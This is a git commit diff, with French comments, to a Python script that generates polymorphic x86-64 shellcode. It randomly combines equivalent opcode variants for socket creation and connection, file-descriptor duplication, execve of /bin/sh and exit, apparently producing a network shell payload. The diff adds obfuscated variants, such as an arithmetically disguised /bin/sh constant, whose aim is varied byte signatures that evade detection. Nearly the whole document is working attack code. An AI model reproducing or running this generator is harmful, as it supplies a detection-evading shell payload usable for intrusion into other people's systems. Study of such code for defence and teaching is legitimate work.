b23e53955920149fa96cf9734e52544703bf44de
Alexy "OxyDe <46215222+OxyDeV2@users.noreply.github.com>
2023-07-27 19:34:59 +0200

    =- SHELLCODE POLYMORPHIQUE -=

--- generateur.py
+++ generateur.py
@@ -2,7 +2,14 @@ import random
 
 shellcode = ""
 
-###### CREATION SOCKET ######
+shellcodeart = '''
+__________      .__          _________.__           .__  .__            ___________ _________ ________.___ 
+\______   \____ |  | ___.__./   _____/|  |__   ____ |  | |  |           \_   _____//   _____//  _____/|   |
+ |     ___/  _ \|  |<   |  |\_____  \ |  |  \_/ __ \|  | |  |    ______  |    __)_ \_____  \/   \  ___|   |
+ |    |  (  <_> )  |_\___  |/        \|   Y  \  ___/|  |_|  |__ /_____/  |        \/        \    \_\  \   |
+ |____|   \____/|____/ ____/_______  /|___|  /\___  >____/____/         /_______  /_______  /\______  /___|
+                     \/            \/      \/     \/                            \/        \/        \/     
+'''
 
 #mov al, 41 -> B029
 #mov al, 40 - add al, 1 -> b0280401
@@ -104,35 +111,26 @@ connexion_socket_11 = ["4831F6",]
 #xor r9, r9 - mov r9b, 2 - mov sil, r9b -> 4D31C941B1024488CE
 
 connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
-# Constant = 7df4 #.loop
 
-###### XOR START LOOP ######
+list_const_loop = ["7df4"] 
+# Constant = 7df4 .loop
+
+list_xorloop = ["4831c0", "4d31c04c89c0"]
 
 # xor rax, rax [Default] -> 4831c0
 
 # xor r8, r8
 # mov rax, r8 -> 4d31c04c89c0 
 
-# mov al, 1
-# sub al, 1 -> b0012c01
-
-###### LOOP ######
+list_loop = ["b021"]
 
 # mov al, 0x21 -> b021 [Default]
 
-# mov al, 0x11
-# add al, 0x10 -> b0110410
+list_loopconstante = ["0F0548ffce7df4"]
 
-# mov al, 0x38
-# sub al 0x17 -> b0382c17
+# Constante = 0F0548ffce7df4
 
-# add al, 0xb
-# add al, 0xb
-# add al, 0xb -> adda0badda0badda0b
-
-# Constante = B0210F0548ffce7df4
-
- ###### XOR BEFORE SYSCALL ######
+list_xor = ["4831c04831d2" , "4831d24831c0", "4889d04831d04831d2"]
 
 # xor rax, rax
 # xor rdx, rdx -> 4831c04831d2 [Default]
@@ -144,36 +142,36 @@ connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
 # xor rax, rdx
 # xor rdx, rdx -> 4889d04831d04831d2
 
-####### /bin/sh ######
+list_binbash = ["48BB2F2F62696E2F7368", "48BB310A4D586E2F73684881C3FE241511"]
 
 # mov rbx, 0x68732f6e69622f2f [Default] -> 48BB2F2F62696E2F7368
 
 # mov rbx, 0x68732f6e584d0a31
 # add rbx, 0x111524fe -> 48BB310A4D586E2F73684881C3FE241511 
 
-
-# mov rbx, 0x68733f5bd2cb3030 -> 48BB3030CBD25B3F73684881EB6969ED0F 
-# sub rbx, 0xfed6969
+list_stackconst = ["50534889E750574889E6"]
 
 # Constante = 50534889E750574889E6
 
-###### SYSCALL EXECVE ######
+list_execve = ["B03B", "B03A0401"]
 
 # mov al, 0x3b -> B03B
 
 # mov al, 0x3a
 # add al, 0x01 -> B03A0401
 
+list_constcallsys = ["0f05"]
+
 # Constante = 0f05
 
- ###### SYSCALL EXIT ######
+list_exit = ["B03C" ,"B0632C27", "B01E041E" ,"B23C4889D0"]
 
 # mov al, 60 -> B03C
 # mov al, 99 - sub al, 39 -> B0632C27
 # mov al, 30 - add al, 30 -> B01E041E
 # mov dl, 60 - mov rax, rdx -> B23C4889D0
 
-###### XOR LAST SYSCALL ######
+list_xorsyscall = ["4831FF", "4D31C04C89C2","b20180ea01"]
 
 # xor rdi, rdi [Default] -> 4831FF
 
@@ -183,22 +181,12 @@ connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
 # mov dl, 1
 # sub dl, 1 -> b20180ea01
 
+list_lastcallsys = ["0f05"]
+
 # Constante = 0f05
 
 
-list_const_loop = ["7df4"]
-list_xorloop = ["4831c0"]
-list_loop = ["b021"]
-list_loopconstante = ["0F0548ffce7df4"]
-list_xor = ["4831c04831d2"]
-list_binbash = ["48BB2F2F62696E2F7368"]
-list_stackconst = ["50534889E750574889E6"]
-list_execve = ["B03B"]
-list_constcallsys = ["0f05"]
-list_exit = ["b03c"]
-list_xorsyscall = ["4831FF"]
-list_lastcallsys = ["0f05"]
-
+### Ajouts et randomisation des shellcodes dans le shellcode final ###
 
 shellcode += random.choice(create_socket_1)
 shellcode += random.choice(create_socket_2)
@@ -219,9 +207,9 @@ shellcode += random.choice(connexion_socket_7)
 shellcode += random.choice(connexion_socket_8)
 shellcode += random.choice(connexion_socket_9)
 shellcode += random.choice(connexion_socket_10)
-
 shellcode += random.choice(connexion_socket_11)
 shellcode += random.choice(connexion_socket_12)
+
 shellcode += random.choice(list_xorloop)
 shellcode += random.choice(list_loop)
 shellcode += random.choice(list_loopconstante)
@@ -234,16 +222,21 @@ shellcode += random.choice(list_exit)
 shellcode += random.choice(list_xorsyscall)
 shellcode += random.choice(list_lastcallsys)
 
+# ASCII Art pour flex
+
+print(shellcodeart)
 
 # Fonction qui permet l'ajout des /xFF/
-
 def shellcodize(s):
     shellcode = 'X'
     shellcode += 'X'.join(a+b for a,b in zip(s[::2], s[1::2]))
     shellcode = shellcode.replace('X', '\\x')
-    print("Shellcode :")
+    print("Shellcode polymorphique: \n")
     print(shellcode)
-
-
 shellcodize(shellcode)
-print(len(shellcode))
+
+
+
+print("------------")
+print("La taille du shellcode est de : ",(len(shellcode)), "octets")
+print("\n")
